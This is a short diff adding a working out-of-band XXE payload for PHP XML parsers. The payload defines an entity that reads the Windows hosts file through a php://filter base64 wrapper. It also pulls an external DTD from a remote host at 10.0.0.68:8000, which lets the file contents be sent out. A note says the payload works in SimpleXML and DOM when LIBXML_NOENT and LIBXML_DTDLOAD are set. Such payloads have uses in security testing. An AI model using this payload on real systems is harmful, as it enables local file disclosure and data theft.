@@ -1,0 +1,15 @@
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///WINDOWS/system32/drivers/etc/hosts">
+<!ENTITY % dtd SYSTEM "http://10.0.0.68:8000/file.dtd">
+%dtd;            
+%all;               
+%req;             
+]>
+<creds>
+	<user>ss</user>
+    <pass>mypass</pass>
+</creds>
+
+// notes 
+
+payload works in simplexml and Domapi parser  but you must specify LIBXML_NOENT options or both of them LIBXML_NOENT | LIBXML_DTDLOAD for the payload to work
